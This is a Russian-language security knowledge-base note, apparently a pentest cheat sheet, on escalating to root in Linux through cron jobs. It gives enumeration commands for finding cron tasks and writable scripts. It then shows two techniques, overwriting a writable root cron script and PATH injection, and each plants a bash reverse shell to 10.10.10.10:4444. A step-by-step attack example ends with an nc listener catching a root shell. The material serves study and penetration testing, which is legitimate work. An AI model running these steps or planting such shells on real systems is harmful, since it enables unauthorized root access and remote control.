---
title: "Повышение привилегий в linux через Cron"
id: note-38
created: "03.02.2026 07:04"
category: "06_Linux и повышение привилегий"
tags:
  - иб/linux
  - privesc
---

> [!info] Навигация
> [[🏠 Главная — База знаний ИБ|🏠 Главная]] · Категория: `06_Linux и повышение привилегий` · Дата: `03.02.2026 07:04`

# Повышение привилегий в linux через Cron

Где искать Cron задачи
cat /etc/crontab                     # Системные задачи
ls -la /etc/cron.d/                  # Дополнительные задачи
cat /etc/cron.*/*                    # Ежечасные/ежедневные задачи
ls -la /var/spool/cron/crontabs/     # Пользовательские задачи
crontab -l -u [USERNAME]             # Задачи конкретного пользователя

Поиск уязвимостей
# Все файлы crontab
find /etc/cron* /var/spool/cron -type f 2>/dev/null

# Задачи с правами на запись
find /etc/cron* -type f -writable 2>/dev/null
find /var/spool/cron/crontabs -type f -writable 2>/dev/null

# Скрипты, запускаемые из cron, с правами на запись
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null | grep -E "\.(sh|py)$"

Уязвимости

Записываемый скрипт Cron
/etc/crontab:
* * * * * root /opt/scripts/backup.sh

# Скрипт доступен для записи (-rwxrwxrwx)
# Заменяем содержимое:
echo '#!/bin/bash' > /opt/scripts/backup.sh
echo 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' >> /opt/scripts/backup.sh
chmod +x /opt/scripts/backup.sh

PATH Injection
/etc/crontab:
PATH=/home/user/bin:/usr/local/bin:/usr/bin
* * * * * root antivirus.sh    # Нет полного пути!
* 
# Создаём свой antivirus.sh в /home/user/bin (первый в PATH)
echo 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' > /home/user/bin/antivirus.sh
chmod +x /home/user/bin/antivirus.sh


Пример атаки 

# 1. Нашли уязвимый cron
cat /etc/crontab
# * * * * * root /opt/scripts/backup.sh

# 2. Проверили права
ls -la /opt/scripts/backup.sh
# -rwxrwxrwx 1 root root ...

# 3. Подготовили reverse shell
cat > /opt/scripts/backup.sh << 'EOF'
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"
EOF

# 4. Запустили listener
# На своей машине: nc -lvnp 4444

# 5. Ждём минуту → получаем root shell
